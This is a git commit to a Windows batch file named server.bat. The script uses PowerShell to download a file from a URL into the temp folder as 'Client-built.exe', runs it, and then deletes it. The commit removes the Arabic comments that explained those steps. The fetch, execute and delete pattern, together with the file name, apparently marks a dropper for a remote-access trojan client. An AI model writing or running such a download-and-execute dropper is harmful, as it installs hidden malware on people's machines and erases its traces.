82897e04f5f22e3ba6d8c315d59e4a472c8644ea
TiraUndercoder <128243843+tiraUnderCode@users.noreply.github.com>
2024-09-14 13:54:14 +0300

    Update server.bat

--- server.bat
+++ server.bat
@@ -6,10 +6,9 @@ set "tempFile=%temp%\Client-built.exe"
 
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"
 
-:: تنفيذ الملف مباشرة دون نقله إلى مجلد البداية التلقائي
 start "" "%tempFile%"
 
-:: حذف الملف المؤقت بعد تنفيذه
+
 del "%tempFile%"
 
 endlocal
